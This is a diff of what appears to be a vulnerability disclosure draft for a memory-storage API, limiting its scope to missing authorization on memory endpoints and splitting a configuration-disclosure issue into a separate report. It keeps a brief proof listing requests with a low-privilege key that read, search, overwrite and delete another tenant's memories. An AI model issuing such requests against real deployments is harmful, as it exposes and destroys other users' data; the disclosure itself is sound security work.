@@ -18,7 +18,11 @@ any identifier.
 
 ### Affected endpoints
 `GET /entities`, `GET /memories?user_id=`, `GET /memories/{id}`, `GET /memories/{id}/history`,
-`PUT /memories/{id}`, `DELETE /memories/{id}`, `POST /search`, `GET /configure`.
+`PUT /memories/{id}`, `DELETE /memories/{id}`, `POST /search`.
+
+Scope note: this request covers **memory-namespace authorization only**. The related
+`GET /configure` disclosure (same missing role gate, different data class) is tracked
+separately as **MEM0-2026-02** and is intentionally not part of this CVE.
 
 ### Proof (low-privilege `role=user` key)
 ```
@@ -30,7 +34,6 @@ POST /search {"filters":{"user_id":"alice_tenant"},"threshold":0} -> 200
 PUT /memories/{id} {"text":"overwritten"}        -> 200
 DELETE /memories/{id}                            -> 200
 GET /memories                                    -> 403  role gate exists, bypassed above
-GET /configure                                   -> 200  DB host/port/user
 ```
 
 ### Reproduction
